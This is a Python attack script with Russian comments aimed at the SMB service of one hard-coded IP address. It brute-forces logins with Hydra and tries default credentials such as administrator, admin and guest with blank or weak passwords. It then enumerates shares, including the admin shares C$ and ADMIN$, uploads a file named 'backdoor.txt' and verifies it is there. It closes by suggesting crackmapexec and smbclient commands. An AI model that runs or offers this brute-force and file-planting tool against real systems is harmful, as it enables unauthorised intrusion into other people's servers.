import subprocess
import os
import sys
import time

TARGET_IP = "12.13.14.3"
LOGIN_FILE = "login"  # файл с логинами (как у тебя)
PASS_FILE = "passw"   # файл с паролями (как у тебя)
LOCAL_FILE = "backdoor.txt"
REMOTE_FILE = "backdoor.txt"

def create_files():
    """Создаем необходимые файлы если их нет"""
    if not os.path.exists(LOCAL_FILE):
        print(f"[*] Создаю файл {LOCAL_FILE}...")
        with open(LOCAL_FILE, "w") as f:
            f.write("Backdoor file\n")
            f.write(f"Time: {time.ctime()}\n")
            f.write(f"Target: {TARGET_IP}\n")

def run_hydra():
    """Запускаем Hydra с ТВОИМ синтаксисом"""
    print("\n" + "="*50)
    print("[*] Запускаю Hydra...")
    
    # ТВОЙ синтаксис: hydra -L login -P passw -o found smb2://12.13.14.3
    hydra_cmd = f"hydra -L {LOGIN_FILE} -P {PASS_FILE} -o found smb2://{TARGET_IP}"
    print(f"[*] Команда: {hydra_cmd}")
    
    try:
        # Запускаем Hydra
        result = subprocess.run(hydra_cmd, shell=True, capture_output=True, text=True, timeout=300)
        
        print("[*] Вывод Hydra:")
        print("-" * 40)
        print(result.stdout)
        if result.stderr:
            print("\n[!] Ошибки Hydra:")
            print(result.stderr)
        print("-" * 40)
        
        # Проверяем результат
        if result.returncode == 0:
            print("[+] Hydra завершилась успешно")
        else:
            print(f"[-] Hydra завершилась с кодом {result.returncode}")
            
        # Проверяем найденные данные в файле found
        if os.path.exists("found"):
            print("[+] Файл 'found' создан, проверяем...")
            with open("found", "r") as f:
                content = f.read()
                print("[*] Содержимое файла found:")
                print(content)
                
                # Парсим логин и пароль
                for line in content.split('\n'):
                    if TARGET_IP in line and "login" in line:
                        # Формат: host: 12.13.14.3 login: admin password: pass123
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if "login:" in part and i+1 < len(parts):
                                username = parts[i+1]
                            if "password:" in part and i+1 < len(parts):
                                password = parts[i+1]
                        
                        if username and password:
                            print(f"[+] Найдены учетные данные: {username}:{password}")
                            return username, password
        else:
            print("[-] Файл 'found' не создан - Hydra не нашла учетные данные")
            
    except subprocess.TimeoutExpired:
        print("[-] Hydra timeout (5 минут)")
    except Exception as e:
        print(f"[-] Ошибка при запуске Hydra: {e}")
    
    return None, None

def test_smb_directly():
    """Прямое тестирование SMB без Hydra"""
    print("\n" + "="*50)
    print("[*] Прямое тестирование SMB...")
    
    # Сначала проверяем доступность
    print("[*] Проверяем доступность SMB...")
    test_cmd = f"smbclient -L //{TARGET_IP}/ -N 2>&1 | head -20"
    result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
    print("[*] Результат проверки:")
    print(result.stdout)
    
    # Тестируем стандартные учетные данные
    test_creds = [
        ("administrator", ""),
        ("administrator", "admin"),
        ("admin", "admin"),
        ("guest", ""),
    ]
    
    for user, pwd in test_creds:
        print(f"[*] Тестирую: {user}:{pwd if pwd else '(пустой)'}")
        cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{user}%{pwd}' -c 'exit' 2>/dev/null"
        if subprocess.run(cmd, shell=True).returncode == 0:
            print(f"[+] Работает: {user}:{pwd}")
            return user, pwd
    
    return None, None

def upload_file(username, password):
    """Загружаем файл на сервер"""
    print("\n" + "="*50)
    print("[*] Пробую загрузить файл...")
    
    # Сначала находим доступные шары
    print("[*] Ищу доступные шары...")
    shares_cmd = f"smbclient -L //{TARGET_IP}/ -U '{username}%{password}'"
    result = subprocess.run(shares_cmd, shell=True, capture_output=True, text=True)
    
    shares = []
    if result.returncode == 0:
        for line in result.stdout.split('\n'):
            if 'Disk' in line:
                share_name = line.split()[0]
                shares.append(share_name)
                print(f"   Найден шар: {share_name}")
    
    # Если не нашли через список, пробуем стандартные
    if not shares:
        shares = ['C$', 'ADMIN$', 'D$', 'E$', 'IPC$']
    
    # Пробуем загрузить на каждый доступный шар
    for share in shares:
        if share == 'IPC$':
            continue  # На IPC$ нельзя загружать файлы
            
        print(f"\n[*] Пробую шар: {share}")
        
        # Сначала проверяем доступ
        test_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'exit'"
        if subprocess.run(test_cmd, shell=True, capture_output=True, text=True).returncode != 0:
            print(f"   [-] Нет доступа к шару {share}")
            continue
            
        print(f"   [+] Есть доступ к шару {share}")
        
        # Пробуем загрузить файл
        upload_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'put {LOCAL_FILE} {REMOTE_FILE}'"
        print(f"   [*] Команда загрузки: {upload_cmd}")
        
        result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"   [+] Файл загружен на {share}!")
            print(f"   [+] Путь: \\\\{TARGET_IP}\\{share}\\{REMOTE_FILE}")
            
            # Проверяем что файл действительно есть
            check_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'dir {REMOTE_FILE}'"
            check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
            
            if check_result.returncode == 0:
                print("   [+] Файл подтвержден на сервере!")
            return True
        else:
            print(f"   [-] Ошибка загрузки: {result.stderr[:100]}")
    
    return False

def main():
    print("="*60)
    print("SMB АТАКА И ЗАГРУЗКА ФАЙЛА")
    print(f"Цель: {TARGET_IP}")
    print("="*60)
    
    # Создаем файлы если нужно
    create_files()
    
    # Проверяем существуют ли файлы с логинами и паролями
    if not os.path.exists(LOGIN_FILE):
        print(f"[-] Файл {LOGIN_FILE} не найден!")
        print("[*] Создайте файл с логинами (по одному на строку)")
        return
    
    if not os.path.exists(PASS_FILE):
        print(f"[-] Файл {PASS_FILE} не найден!")
        print("[*] Создайте файл с паролями (по одному на строку)")
        return
    
    # Получаем учетные данные
    username, password = None, None
    
    # Вариант 1: Hydra
    print("\n1. Пробую Hydra...")
    username, password = run_hydra()
    
    # Вариант 2: Прямое тестирование
    if not username or not password:
        print("\n2. Hydra не сработала, пробую прямое тестирование...")
        username, password = test_smb_directly()
    
    # Вариант 3: Ручной ввод
    if not username or not password:
        print("\n3. Все автоматические методы провалились")
        print("[*] Введите учетные данные вручную")
        username = input("Логин: ").strip()
        password = input("Пароль (Enter если пустой): ").strip()
    
    if not username:
        print("[-] Не указан логин. Выход.")
        return
    
    print(f"\n[+] Использую учетные данные: {username}:{password if password else '(пустой)'}")
    
    # Загружаем файл
    if upload_file(username, password):
        print("\n" + "="*50)
        print("[+] УСПЕХ! Файл загружен на сервер!")
        print("[+] Проверьте: smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
    else:
        print("\n" + "="*50)
        print("[-] Не удалось загрузить файл")
        print("[*] Возможные причины:")
        print("    - Нет прав на запись")
        print("    - Нет доступа к дисковым шарам")
        print("    - Фаервол блокирует запись")
        
        print("\n[*] Дополнительные команды для проверки:")
        print(f"    smbclient -L //{TARGET_IP}/ -U '{username}%{password}'")
        print(f"    smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
        print(f"    crackmapexec smb {TARGET_IP} -u '{username}' -p '{password}' --shares")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Прервано пользователем")
    except Exception as e:
        print(f"\n[-] Ошибка: {e}")
